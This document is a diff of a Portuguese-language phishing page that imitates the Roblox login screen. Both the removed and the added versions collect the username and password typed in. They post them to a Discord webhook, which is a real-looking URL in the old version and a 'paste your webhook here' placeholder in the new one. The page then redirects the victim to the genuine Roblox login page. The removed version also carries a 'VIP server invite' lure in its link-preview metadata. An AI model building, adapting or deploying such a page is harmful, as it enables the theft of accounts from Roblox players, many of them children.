@@ -3,11 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Servidor VIP</title>
-    <meta property="og:title" content="Convite de Servidor Privado">
-    <meta property="og:description" content="Você foi convidado para um servidor VIP. Clique para entrar.">
-    <meta property="og:image" content="https://tr.rbxcdn.com/f957f12e2e921d7b0f2a9692dd583a65.png">
-    
+    <title>Entrar na Roblox</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
 
@@ -15,128 +11,120 @@
             margin: 0;
             padding: 0;
             font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-image: url('https://images.rbxcdn.com/f957f12e2e921d7b0f2a9692dd583a65.png');
+            /* LINK ATUALIZADO PARA A GRADE DE JOGOS */
+            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #fff;
             overflow: hidden;
         }
 
-        .overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 1;
-        }
-
-        .login-container {
-            position: relative;
-            z-index: 2;
-            width: 100%;
-            max-width: 440px;
-            text-align: center;
-            padding: 0 20px;
-        }
-
-        .roblox-logo {
-            width: 220px;
-            margin-bottom: 40px;
-        }
-
-        .input-group {
-            background-color: rgba(25, 25, 25, 0.9);
-            padding: 25px;
+        .login-box {
+            background-color: #393b3d;
+            padding: 40px 30px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            z-index: 2;
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 32px;
+            margin-bottom: 25px;
+            font-weight: 700;
         }
 
         input {
             width: 100%;
-            height: 48px;
-            padding: 10px 15px;
-            margin-bottom: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            height: 45px;
+            background-color: #191b1d;
+            border: 1px solid #454749;
             border-radius: 4px;
-            box-sizing: border-box;
-            background-color: rgba(0, 0, 0, 0.3);
             color: #fff;
+            padding: 0 12px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
             font-size: 16px;
         }
 
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-        }
-
-        .entrar-btn {
+        .btn-entrar {
             width: 100%;
-            height: 48px;
-            background-color: rgba(255, 255, 255, 0.3);
-            color: rgba(255, 255, 255, 0.8);
-            border: none;
+            height: 45px;
+            background-color: transparent;
+            border: 1px solid #fff;
+            color: #fff;
             border-radius: 4px;
             font-size: 18px;
-            font-weight: 500;
             cursor: pointer;
-            margin-top: 10px;
+            margin-bottom: 20px;
         }
 
-        .links-extra {
-            margin-top: 25px;
+        .links {
+            color: #fff;
             font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            display: block;
+            margin-bottom: 15px;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            height: 45px;
+            background-color: #4f5153;
+            border: none;
+            color: #fff;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 10px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-<div class="overlay"></div>
-
-<div class="login-container">
-    <img src="https://images.rbxcdn.com/2012d26f30e7740fc9257039a037b514.svg" alt="Roblox" class="roblox-logo">
+<div class="login-box">
+    <h1>Entrar na Roblox</h1>
     
-    <div class="input-group">
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
-        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
-        <button class="entrar-btn" onclick="capture()">Entrar</button>
-    </div>
-
-    <div class="links-extra">
-        Esqueceu a senha ou nome de usuário? <br>
-        <a href="#" style="color: #0084ff; text-decoration: none;">Termos</a> | <a href="#" style="color: #0084ff; text-decoration: none;">Privacidade</a>
-    </div>
+    <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
+    <input type="password" id="pass" placeholder="Senha">
+    
+    <button class="btn-entrar" onclick="send()">Entrar</button>
+    
+    <a href="#" class="links">Esqueceu a senha ou nome de usuário?</a>
+    
+    <button class="btn-secondary">Envie-me um código único por e-mail</button>
+    <button class="btn-secondary">Entrada rápida</button>
+    
+    <p style="color: #fff; font-size: 14px; margin-top: 20px;">
+        Não possui uma conta? <a href="#" style="color: #fff;">Cadastrar-se</a>
+    </p>
 </div>
 
 <script>
-    function capture() {
+    function send() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        const webhook = "https://discord.com/api/webhooks/1484149300991754350/QG4Qwn3sGu68Mj9Gq221Zow6uHGytBk6Smny_59O4paacJP5eRI6om39KFKiV1sLUaaQ"; // <-- COLOQUE SEU LINK DO DISCORD AQUI
+        const webhook = "COLE_AQUI_SEU_WEBHOOK"; // <-- COLOQUE SEU WEBHOOK AQUI
 
-        if(u === "" || p === "") return alert("Preencha os campos!");
-
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🚨 **CONTA CAPTURADA** 🚨",
-                    color: 16711680,
-                    fields: [
-                        { name: "👤 Usuário", value: `\`${u}\`` },
-                        { name: "🔑 Senha", value: `\`${p}\`` }
-                    ],
-                    timestamp: new Date()
-                }]
-            })
-        }).then(() => {
-            window.location.href = "https://www.roblox.com/login";
-        });
+        if(u && p) {
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `🚨 **LOG CAPTURADO** 🚨\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\``
+                })
+            }).then(() => {
+                window.location.href = "https://www.roblox.com/login";
+            });
+        }
     }
 </script>
+
 </body>
 </html>
